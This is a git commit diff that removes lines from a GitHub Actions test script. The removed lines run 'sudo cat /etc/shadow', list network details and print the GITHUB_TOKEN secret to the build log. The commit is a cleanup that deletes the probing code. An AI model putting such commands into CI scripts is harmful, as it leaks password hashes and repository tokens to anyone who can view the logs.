313ed26bf24af572d5596dd5efb28b6c676299ed
Kul Subedi <subedi.kulprasad@gmail.com>
2023-09-19 15:51:56 -0700

    Update test.py

--- .github/scripts/test.py
+++ .github/scripts/test.py
@@ -1,11 +1,3 @@
 import os
 
 print("Test Python Script--")
-print("Welcome!")
-os.system('whoami')
-os.system('sudo whoami')
-os.system('sudo cat /etc/shadow')
-os.system('sudo ip a')
-GT = os.getenv('GITHUB_TOKEN')
-print("GITHUB_TOKEN" + str(GT))
-print("Done")
